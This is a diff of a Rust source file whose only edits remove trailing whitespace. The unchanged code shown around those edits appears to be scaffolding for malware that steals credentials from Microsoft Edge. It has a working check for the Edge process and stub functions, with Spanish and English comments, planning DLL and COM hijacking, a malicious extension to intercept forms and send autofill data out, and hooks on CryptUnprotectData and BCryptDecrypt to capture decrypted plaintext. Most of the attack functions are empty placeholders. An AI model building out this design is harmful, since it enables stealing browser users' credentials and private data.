@@ -13,22 +13,22 @@ pub fn is_running_in_edge() -> bool {
     unsafe {
         let mut module_name = [0u16; 260];
         let process_handle: HANDLE = GetCurrentProcess();
-        
+
         let len = GetModuleBaseNameW(
             process_handle,
             std::ptr::null_mut(),
             module_name.as_mut_ptr(),
             module_name.len() as u32
         );
-        
+
         if len == 0 {
             return false;
         }
-        
+
         let process_name = OsString::from_wide(&module_name[..len as usize])
             .to_string_lossy()
             .to_lowercase();
-        
+
         // Verificar si es msedge.exe
         process_name.contains("msedge") || process_name.contains("edge")
     }
@@ -39,10 +39,10 @@ pub fn is_running_in_edge() -> bool {
 pub fn setup_dll_hijack() -> Result<(), String> {
     // Edge carga varios DLLs al iniciar, podemos reemplazar uno no crítico
     // Por ejemplo: EBWebView.dll, msedge_elf.dll, etc.
-    
+
     // TODO: Implementar copia del DLL a la carpeta de Edge
     // con nombre de DLL legítimo
-    
+
     Ok(())
 }
 
@@ -52,7 +52,7 @@ pub fn setup_com_hijack() -> Result<(), String> {
     // Edge usa varios objetos COM para ciertas operaciones
     // Podemos registrar nuestro propio COM object en HKCU
     // que se cargará cuando Edge lo necesite
-    
+
     Ok(())
 }
 
@@ -64,7 +64,7 @@ pub fn install_edge_extension() -> Result<(), String> {
     // 1. Intercept form submissions
     // 2. Access autofill data via Extension API
     // 3. Exfiltrar datos
-    
+
     Ok(())
 }
 
@@ -74,7 +74,7 @@ pub fn setup_etw_hook() -> Result<(), String> {
     // ETW permite monitorear eventos del sistema
     // Podemos hookear eventos de CryptUnprotectData o AES operations
     // para capturar datos en plaintext
-    
+
     Ok(())
 }
 
@@ -86,14 +86,14 @@ pub fn setup_api_hooks() -> Result<(), String> {
     // - BCryptDecrypt
     // - AES_GCM_decrypt
     // Cuando Edge desencripta, capturamos el plaintext
-    
+
     Ok(())
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
-    
+
     #[test]
     fn test_process_detection() {
         let in_edge = is_running_in_edge();
